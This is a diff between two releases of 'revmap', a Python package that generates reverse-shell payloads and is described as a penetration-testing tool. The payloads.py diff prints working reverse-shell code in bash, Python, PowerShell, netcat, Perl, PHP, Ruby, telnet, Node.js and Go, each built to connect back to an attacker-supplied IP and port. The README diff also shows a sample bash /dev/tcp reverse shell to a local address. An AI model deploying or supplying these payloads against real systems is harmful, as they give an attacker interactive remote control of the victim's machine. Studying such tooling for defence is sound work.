# Comparing `tmp/revmap-0.0.4.tar.gz` & `tmp/revmap-0.0.5.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "revmap-0.0.4.tar", last modified: Fri May 26 00:10:59 2023, max compression
+gzip compressed data, was "revmap-0.0.5.tar", last modified: Thu Jun  8 13:25:05 2023, max compression
```

## Comparing `revmap-0.0.4.tar` & `revmap-0.0.5.tar`

### file list

```diff
@@ -1,22 +1,35 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/
--rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-05-26 00:10:44.000000 revmap-0.0.4/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-26 00:10:59.355746 revmap-0.0.4/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)     2813 2023-05-26 00:10:44.000000 revmap-0.0.4/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/revmap/
--rw-r--r--   0 runner    (1001) docker     (123)       69 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)       73 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__main__.py
--rw-r--r--   0 runner    (1001) docker     (123)      365 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/__meta__.py
--rw-r--r--   0 runner    (1001) docker     (123)      522 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/encoded.py
--rw-r--r--   0 runner    (1001) docker     (123)     3922 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/payloads.py
--rw-r--r--   0 runner    (1001) docker     (123)     4733 2023-05-26 00:10:44.000000 revmap-0.0.4/revmap/revmap.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/revmap.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)     4149 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      336 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       52 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/entry_points.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/not-zip-safe
--rw-r--r--   0 runner    (1001) docker     (123)       12 2023-05-26 00:10:59.000000 revmap-0.0.4/revmap.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       38 2023-05-26 00:10:59.355746 revmap-0.0.4/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     1838 2023-05-26 00:10:44.000000 revmap-0.0.4/setup.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:59.355746 revmap-0.0.4/test/
--rw-r--r--   0 runner    (1001) docker     (123)        0 2023-05-26 00:10:44.000000 revmap-0.0.4/test/__init__.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/
+-rw-r--r--   0 runner    (1001) docker     (123)     1078 2023-06-08 13:24:53.000000 revmap-0.0.5/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)     3481 2023-06-08 13:25:05.222013 revmap-0.0.5/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)     2145 2023-06-08 13:24:53.000000 revmap-0.0.5/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/revmap/
+-rw-r--r--   0 runner    (1001) docker     (123)       68 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)       73 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/__main__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      365 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/__meta__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      554 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/encoded.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/revmap/events/
+-rw-r--r--   0 runner    (1001) docker     (123)       23 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/events/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      311 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/events/keyboard.py
+-rw-r--r--   0 runner    (1001) docker     (123)     4010 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/payloads.py
+-rw-r--r--   0 runner    (1001) docker     (123)      999 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/revmap.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/revmap/settings/
+-rw-r--r--   0 runner    (1001) docker     (123)      116 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/settings/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)      729 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/settings/color_settings.py
+-rw-r--r--   0 runner    (1001) docker     (123)      706 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/settings/message_settings.py
+-rw-r--r--   0 runner    (1001) docker     (123)      219 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/settings/variables.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/revmap/utils/
+-rw-r--r--   0 runner    (1001) docker     (123)       57 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/utils/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2177 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/utils/commands.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3378 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/utils/generator_payloads.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1003 2023-06-08 13:24:53.000000 revmap-0.0.5/revmap/utils/validator_required.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/revmap.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)     3481 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      635 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       52 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/entry_points.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/not-zip-safe
+-rw-r--r--   0 runner    (1001) docker     (123)       12 2023-06-08 13:25:05.000000 revmap-0.0.5/revmap.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       38 2023-06-08 13:25:05.222013 revmap-0.0.5/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     1838 2023-06-08 13:24:53.000000 revmap-0.0.5/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-08 13:25:05.222013 revmap-0.0.5/test/
+-rw-r--r--   0 runner    (1001) docker     (123)        0 2023-06-08 13:24:53.000000 revmap-0.0.5/test/__init__.py
```

### Comparing `revmap-0.0.4/LICENSE` & `revmap-0.0.5/LICENSE`

 * *Files identical despite different names*

### Comparing `revmap-0.0.4/PKG-INFO` & `revmap-0.0.5/PKG-INFO`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: revmap
-Version: 0.0.4
+Version: 0.0.5
 Summary: Tool that generates reverse shell in multiple languages and encodes
 Home-page: https://github.com/joaoviictorti/revmap
 Author: joaoviictorti (viictorjj)
 Author-email: joaovictorti08@gmail.com
 License: MIT License
 Keywords: revshell shell python security
 Classifier: Development Status :: 5 - Production/Stable
@@ -57,54 +57,37 @@
 
  - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
  - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
 
 # Forma de utilização
 
 ```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+revmap --ip 192.168.4.80 --port 4444
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.4 - @joaoviictorti 
+        v0.0.5 - @joaoviictorti 
 
 options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
+  -h, --help    show this help message and exit
+  --version     show program's version number and exit
+  --ip IP       Insert ip
+  --port PORTA  Insert port
 ```
 
 # Instalação
 
 revmap requer **python3** e para baixá-lo só usar:
 
 ```sh
 pip3 install revmap
 ```
 
 # Executando revmap
 
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.4 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
+![logo_do_projeto](images/revmap_console.png)
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.4 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.5 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
@@ -29,23 +29,16 @@
 uma coisa: gera payloads reverse shell + encodes e faz isso muito bem. Projetei
 o `revmap` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads de reverse shell
 para diversas linguagens de programaÃ§Ã£o (python, bash, powershell e etc) -
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
-port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
-4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
-exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
-suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
-message and exit --version show program's version number and exit --ip IP
-Insert ip --port PORTA Insert port --payload
-{bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
-Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
-revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
-``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
-payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
-192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
+port 4444 ``` Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os
+switches que ele suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'|
+. | |_| |___|\_/|_|_|_|__,| _| |_| v0.0.5 - @joaoviictorti options: -h, --help
+show this help message and exit --version show program's version number and
+exit --ip IP Insert ip --port PORTA Insert port ``` # InstalaÃ§Ã£o revmap
+requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap ``` #
+Executando revmap ![logo_do_projeto](images/revmap_console.png) [https://
+capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.4/README.md` & `revmap-0.0.5/README.md`

 * *Files 26% similar despite different names*

```diff
@@ -25,54 +25,37 @@
 
  - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
  - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
 
 # Forma de utilização
 
 ```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+revmap --ip 192.168.4.80 --port 4444
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.4 - @joaoviictorti 
+        v0.0.5 - @joaoviictorti 
 
 options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
+  -h, --help    show this help message and exit
+  --version     show program's version number and exit
+  --ip IP       Insert ip
+  --port PORTA  Insert port
 ```
 
 # Instalação
 
 revmap requer **python3** e para baixá-lo só usar:
 
 ```sh
 pip3 install revmap
 ```
 
 # Executando revmap
 
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.4 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
+![logo_do_projeto](images/revmap_console.png)
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -12,23 +12,16 @@
 uma coisa: gera payloads reverse shell + encodes e faz isso muito bem. Projetei
 o `revmap` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads de reverse shell
 para diversas linguagens de programaÃ§Ã£o (python, bash, powershell e etc) -
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
-port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
-4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
-exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
-suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
-message and exit --version show program's version number and exit --ip IP
-Insert ip --port PORTA Insert port --payload
-{bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
-Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
-revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
-``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
-payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
-192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
+port 4444 ``` Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os
+switches que ele suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'|
+. | |_| |___|\_/|_|_|_|__,| _| |_| v0.0.5 - @joaoviictorti options: -h, --help
+show this help message and exit --version show program's version number and
+exit --ip IP Insert ip --port PORTA Insert port ``` # InstalaÃ§Ã£o revmap
+requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap ``` #
+Executando revmap ![logo_do_projeto](images/revmap_console.png) [https://
+capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.4/revmap/payloads.py` & `revmap-0.0.5/revmap/payloads.py`

 * *Files 12% similar despite different names*

```diff
@@ -1,96 +1,96 @@
 from .encoded import Encode
 
 
 class Bash(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
             f"bash -c 'exec bash -i &>/dev/tcp/{self.__ip}/{self.__porta} <&1'"
         )
         super().__init__(self.__payload)
 
 
 class Python(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.__ip}",{self.__porta}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\''
         super().__init__(self.__payload)
 
 
 class Powershell(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
             "$client = New-Object System.Net.Sockets.TCPClient('"
             + self.__ip
             + "',"
             + self.__porta
             + ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
         )
         super().__init__(self.__payload)
 
 
 class Netcat(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'nc -vn {self.__ip} {self.__porta} -e "/bin/bash"'
         super().__init__(self.__payload)
 
 
 class Perl(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
-        self.__payload = 'perl -e \'use Socket;$i="$ENV{'
-        +self.__ip
-        +'}"+";$p=$ENV{'
-        +self.__porta
+        self.__payload = 'perl -e \'use Socket;$i="$ENV{' \
+        +self.__ip \
+        +'}"+";$p=$ENV{' \
+        +self.__porta \
         +'};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
         super().__init__(self.__payload)
 
 
 class PHP(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'php -r \'$sock=fsockopen(getenv({self.__ip}),getenv({self.__porta}));exec("/bin/sh -i <&3 >&3 2>&3");\''
         super().__init__(self.__payload)
 
 
 class Ruby(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'ruby -rsocket -e\'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{self.__ip}",{self.__porta}))\''
         super().__init__(self.__payload)
 
 
 class Telnet(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f'TF=$(mktemp -u);mkfifo $TF && telnet {self.__ip} {self.__porta} 0<$TF | sh 1>$TF'
         super().__init__(self.__payload)
 
 
 class NodeJs(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = f"require('child_process').execSync('nc -e sh {self.__ip} {self.__porta}')"
         super().__init__(self.__payload)
 
 
 class Golang(Encode):
-    def __init__(self: object, ip: str, porta: str):
+    def __init__(self: object, ip: str, porta: str) -> None:
         self.__ip = ip
         self.__porta = porta
         self.__payload = (
             'echo \'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","'
             + self.__ip
             + ':'
             + self.__porta
```

### Comparing `revmap-0.0.4/revmap.egg-info/PKG-INFO` & `revmap-0.0.5/revmap.egg-info/PKG-INFO`

 * *Files 9% similar despite different names*

```diff
@@ -1,10 +1,10 @@
 Metadata-Version: 2.1
 Name: revmap
-Version: 0.0.4
+Version: 0.0.5
 Summary: Tool that generates reverse shell in multiple languages and encodes
 Home-page: https://github.com/joaoviictorti/revmap
 Author: joaoviictorti (viictorjj)
 Author-email: joaovictorti08@gmail.com
 License: MIT License
 Keywords: revshell shell python security
 Classifier: Development Status :: 5 - Production/Stable
@@ -57,54 +57,37 @@
 
  - Gera payloads de reverse shell para diversas linguagens de programação (python, bash, powershell e etc)
  - Funcionalidade de realizar encode das payloads desejadas (Url encode, base64, hexadecimal e etc)
 
 # Forma de utilização
 
 ```sh
-revmap --ip 192.168.4.80 --port 4444 --payload bash --encode urlencode
-revmap --ip 192.168.4.80 --port 4444 --payload bash 
-revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64
+revmap --ip 192.168.4.80 --port 4444
 ```
 Isso exibirá a ajuda para a ferramenta. Aqui estão todos os switches que ele suporta:
 ```yaml
  ___ ___ _ _ _____ ___ ___ 
 |  _| -_| | |     | .'| . |
 |_| |___|\_/|_|_|_|__,|  _|
                       |_|  
-        v0.0.4 - @joaoviictorti 
+        v0.0.5 - @joaoviictorti 
 
 options:
-  --h, --help            show this help message and exit
-  --version             show program's version number and exit
-  --ip IP                Insert ip
-  --port PORTA           Insert port
-  --payload {bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang} Insert payload
-  --encode {base64,hex,urlencode} Insert encode
+  -h, --help    show this help message and exit
+  --version     show program's version number and exit
+  --ip IP       Insert ip
+  --port PORTA  Insert port
 ```
 
 # Instalação
 
 revmap requer **python3** e para baixá-lo só usar:
 
 ```sh
 pip3 install revmap
 ```
 
 # Executando revmap
 
-```console
-revmap --ip 192.168.4.160 --port 8080 --payload bash
-
- ___ ___ _ _ _____ ___ ___ 
-|  _| -_| | |     | .'| . |
-|_| |___|\_/|_|_|_|__,|  _|
-                      |_|  
-        v0.0.4 - @joaoviictorti 
-                                               
-
-bash -c 'exec bash -i &>/dev/tcp/192.168.4.160/8080 <&1'
-```
-
+![logo_do_projeto](images/revmap_console.png)
 
 <img width=100% src="https://capsule-render.vercel.app/api?type=waving&color=0000FF&height=120&section=footer"/>
```

#### html2text {}

```diff
@@ -1,8 +1,8 @@
-Metadata-Version: 2.1 Name: revmap Version: 0.0.4 Summary: Tool that generates
+Metadata-Version: 2.1 Name: revmap Version: 0.0.5 Summary: Tool that generates
 reverse shell in multiple languages and encodes Home-page: https://github.com/
 joaoviictorti/revmap Author: joaoviictorti (viictorjj) Author-email:
 joaovictorti08@gmail.com License: MIT License Keywords: revshell shell python
 security Classifier: Development Status :: 5 - Production/Stable Classifier:
 Environment :: Console Classifier: Intended Audience :: System Administrators
 Classifier: License :: OSI Approved :: GNU General Public License v3 (GPLv3)
 Classifier: Natural Language :: English Classifier: Operating System :: OS
@@ -29,23 +29,16 @@
 uma coisa: gera payloads reverse shell + encodes e faz isso muito bem. Projetei
 o `revmap` para cumprir todas as responsabilidades para gera payloads e
 encodes, mantive um modelo consistentemente passivo para tornÃ¡-lo Ãºtil para
 testadores de penetraÃ§Ã£o. # CaracterÃ­sticas - Gera payloads de reverse shell
 para diversas linguagens de programaÃ§Ã£o (python, bash, powershell e etc) -
 Funcionalidade de realizar encode das payloads desejadas (Url encode, base64,
 hexadecimal e etc) # Forma de utilizaÃ§Ã£o ```sh revmap --ip 192.168.4.80 --
-port 4444 --payload bash --encode urlencode revmap --ip 192.168.4.80 --port
-4444 --payload bash revmap --ip 192.168.4.80 --port 4444 --payload python
-revmap --ip 192.168.4.80 --port 4444 --payload perl --encode base64 ``` Isso
-exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os switches que ele
-suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti options: --h, --help show this help
-message and exit --version show program's version number and exit --ip IP
-Insert ip --port PORTA Insert port --payload
-{bash,python,powershell,nc,php,perl,ruby,telnet,xterm,mkfifo,java,golang}
-Insert payload --encode {base64,hex,urlencode} Insert encode ``` # InstalaÃ§Ã£o
-revmap requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap
-``` # Executando revmap ```console revmap --ip 192.168.4.160 --port 8080 --
-payload bash ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'| . | |_| |___|\_/
-|_|_|_|__,| _| |_| v0.0.4 - @joaoviictorti bash -c 'exec bash -i &>/dev/tcp/
-192.168.4.160/8080 <&1' ``` [https://capsule-render.vercel.app/
+port 4444 ``` Isso exibirÃ¡ a ajuda para a ferramenta. Aqui estÃ£o todos os
+switches que ele suporta: ```yaml ___ ___ _ _ _____ ___ ___ | _| -_| | | | .'|
+. | |_| |___|\_/|_|_|_|__,| _| |_| v0.0.5 - @joaoviictorti options: -h, --help
+show this help message and exit --version show program's version number and
+exit --ip IP Insert ip --port PORTA Insert port ``` # InstalaÃ§Ã£o revmap
+requer **python3** e para baixÃ¡-lo sÃ³ usar: ```sh pip3 install revmap ``` #
+Executando revmap ![logo_do_projeto](images/revmap_console.png) [https://
+capsule-render.vercel.app/
 api?type=waving&color=0000FF&height=120&section=footer]
```

### Comparing `revmap-0.0.4/setup.py` & `revmap-0.0.5/setup.py`

 * *Files identical despite different names*

